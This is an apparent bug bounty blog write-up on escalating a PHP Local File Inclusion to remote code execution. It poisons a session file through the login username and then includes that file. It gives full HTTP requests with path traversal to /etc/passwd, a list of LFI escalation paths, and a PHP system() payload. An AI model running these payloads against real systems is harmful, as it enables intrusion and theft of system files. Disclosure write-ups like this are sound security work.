---
title: Upgrade from LFI to RCE via PHP Sessions
categories:
- BugBounty
- RCE
---
I recently came across an interesting Local File Inclusion vulnerability in a private bug bounty program which I was able to upgrade to a Remote Code Execution. The interesting fact about this and what makes it different is that the underlying operating system was pretty hardened and almost all usual ways to upgrade your LFI were blocked or failed silently.

So here's a short write-up about a handy way to upgrade your LFI, for which I'd also like to credit my fellow bug bounty hunter [@smiegles](https://twitter.com/smiegles) for his tip which finalised my exploit!

Bonus point: It was an unauthenticated Remote Code Execution on a login form ;-)

### A Simple Local File Inclusion Vulnerability

The vulnerable web application basically required some form of authentication before giving access to an administrative upload interface. However the application did also use one smelly parameter called "lang" to specify the language for its UI:

{% highlight html %}
POST /upload/? HTTP/1.1
Host: vulnerable.redacted.com
User-Agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.04
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded
Content-Length: 44
Connection: close
Upgrade-Insecure-Requests: 1

login=1&user=admin&pass=admin&lang=en_us.php
{% endhighlight %}

So this was quite obvious to exploit - at the very first glance - you only had to use path traversal sequences:

{% highlight html %}
POST /upload/? HTTP/1.1
Host: vulnerable.redacted.com
User-Agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.04
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded
Content-Length: 75
Connection: close
Upgrade-Insecure-Requests: 1

login=1&user=admin&pass=admin&lang=../../../../../../../../../../etc/passwd
{% endhighlight %}

This simply fetched the /etc/passwd file and echoed it back in the HTTP response.

### Some common ways of upgrading from LFI to RCE

Now usually when I find a Local File Inclusion, I first try to turn it into a Remote Code Execution before reporting it since they are usually better paid ;-).

So there's a variety of different tricks to turn your LFI into RCE, just like:

1.  Using file upload forms/functions
2.  Using the PHP wrapper expect://command
3.  Using the PHP wrapper php://file
4.  Using the PHP wrapper php://filter
5.  Using PHP input:// stream
6.  Using data://text/plain;base64,command
7.  Using /proc/self/environ
8.  Using /proc/self/fd
9.  Using log files with controllable input like:
    1.  /var/log/apache/access.log
    2.  /var/log/apache/error.log
    3.  /var/log/vsftpd.log
    4.  /var/log/sshd.log
    5.  /var/log/mail

Unfortunately the system was quite hardened and the Apache process did neither have the necessary wrappers enabled nor had it access to any log files or the /proc tree - so any of the above mentioned ways was silently failing with the application just returning its normal "authentication failed" response.

### RCE Using Control over PHP Session Values

While trying to find a way to get some arbitrary code executed without having access to the administrative interface itself, I noticed a quite interesting behaviour of the web application. When trying to authenticate with invalid credentials such as admin/admin:

{% highlight html %}
POST /upload/? HTTP/1.1
Host: vulnerable.redacted.com
User-Agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.04
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded
Content-Length: 44
Connection: close
Upgrade-Insecure-Requests: 1

login=1&user=admin&pass=admin&lang=en_us.php
{% endhighlight %}

The application issued a couple of Set-Cookie instructions like the following, which strongly indicates that the values from the authentication requests might be stored within the PHP session on the server side:

{% highlight html %}
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
Set-Cookie: pass=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
{% endhighlight %}

As you might know PHP5 stores it's session files by default under <span class="s1">/var/lib/php5/sess_[PHPSESSID] - so the above issued session "i56kgbsq9rm8ndg3qbarhsbm27" would be stored under </span>/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.

When having a look at the session file itself using the previously discovered LFI vulnerability:

{% highlight html %}
POST /upload/? HTTP/1.1
Host: vulnerable.redacted.com
User-Agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.04
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27
Content-Length: 107
Connection: close
Upgrade-Insecure-Requests: 1

login=1&user=admin&pass=admin&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27
{% endhighlight %}

indicators even got stronger:

{% highlight html %}
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
{% endhighlight %}

So as a consequence out of this, using some arbitrary PHP code as the username:

{% highlight html %}
POST /upload/? HTTP/1.1
Host: vulnerable.redacted.com
User-Agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.04
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27
Content-Length: 134
Connection: close
Upgrade-Insecure-Requests: 1

login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
{% endhighlight %}

Resulted in an arbitrary value being set in the Set-Cookie directive (and therefore in the session file):

{% highlight html %}
Set-Cookie: user=%3C%3Fphp+system%28%22cat+%2Fetc%2Fpasswd%22%29%3B%3F%3E; expires=Mon, 13-Aug-2018 20:40:53 GMT; path=/; httponly
{% endhighlight %}

The session file could again afterwards be included using the LFI (note that you need to remove the cookie from the request, otherwise it would get overwritten again and the payload would fail):

{% highlight html %}
POST /upload/? HTTP/1.1
Host: vulnerable.redacted.com
User-Agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.04
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded
Content-Length: 141
Connection: close
Upgrade-Insecure-Requests: 1

login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27
{% endhighlight %}

Which resulted in the final Remote Code Execution:

[![]({{ site.baseurl }}/assets/lfi-to-rce-1.png)]({{ site.baseurl }}/assets/lfi-to-rce-1.png)

Take aways: Never forget to sanitize your session variables! ;-)
